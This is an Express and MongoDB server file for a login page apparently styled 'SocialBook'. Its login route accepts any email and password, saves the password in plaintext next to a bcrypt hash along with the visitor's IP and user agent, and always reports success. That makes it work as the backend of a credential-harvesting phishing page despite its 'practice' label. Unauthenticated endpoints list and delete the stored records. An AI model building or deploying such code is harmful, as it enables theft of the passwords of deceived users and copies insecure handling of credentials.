// server.js - Main backend file
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bcrypt = require('bcrypt');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files

// MongoDB connection
mongoose.connect('mongodb://localhost:27017/socialbook_practice', {
    useNewUrlParser: true,
    useUnifiedTopology: true
})
.then(() => {
    console.log('✅ Connected to MongoDB successfully');
    console.log('📊 Database: socialbook_practice');
})
.catch(err => {
    console.error('❌ MongoDB connection error:', err);
});

// Login attempt schema
const loginAttemptSchema = new mongoose.Schema({
    email: {
        type: String,
        required: true
    },
    password: {
        type: String,
        required: true
    },
    hashedPassword: {
        type: String,
        required: true
    },
    timestamp: {
        type: Date,
        default: Date.now
    },
    userAgent: String,
    ip: String,
    success: {
        type: Boolean,
        default: true
    }
});

const LoginAttempt = mongoose.model('LoginAttempt', loginAttemptSchema);

// Routes
// Serve the HTML page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Handle login POST request
app.post('/api/login', async (req, res) => {
    try {
        const { email, password } = req.body;
        
        // Validate input
        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email and password are required'
            });
        }

        // Hash the password for storage
        const saltRounds = 10;
        const hashedPassword = await bcrypt.hash(password, saltRounds);

        // Get client info
        const userAgent = req.get('User-Agent');
        const ip = req.ip || req.connection.remoteAddress;

        // Create new login attempt
        const loginAttempt = new LoginAttempt({
            email,
            password, // In production, you might not want to store this
            hashedPassword,
            userAgent,
            ip,
            success: true // Since we're simulating successful login
        });

        // Save to MongoDB
        await loginAttempt.save();

        console.log('🔐 New login attempt saved:', {
            email,
            timestamp: loginAttempt.timestamp,
            ip
        });

        // Return success response
        res.json({
            success: true,
            message: 'Login successful! Data saved to MongoDB.',
            data: {
                email,
                timestamp: loginAttempt.timestamp,
                id: loginAttempt._id
            }
        });

    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({
            success: false,
            message: 'Server error occurred'
        });
    }
});

// Get all login attempts (for testing/admin purposes)
app.get('/api/login-attempts', async (req, res) => {
    try {
        const attempts = await LoginAttempt.find()
            .select('-password -hashedPassword') // Don't return passwords
            .sort({ timestamp: -1 })
            .limit(50);

        res.json({
            success: true,
            count: attempts.length,
            data: attempts
        });
    } catch (error) {
        console.error('❌ Error fetching login attempts:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching data'
        });
    }
});

// Delete all login attempts (for testing)
app.delete('/api/login-attempts', async (req, res) => {
    try {
        await LoginAttempt.deleteMany({});
        res.json({
            success: true,
            message: 'All login attempts deleted'
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Error deleting data'
        });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log('📝 API Endpoints:');
    console.log('   POST /api/login - Submit login data');
    console.log('   GET /api/login-attempts - View all attempts');
    console.log('   DELETE /api/login-attempts - Clear all data');
});
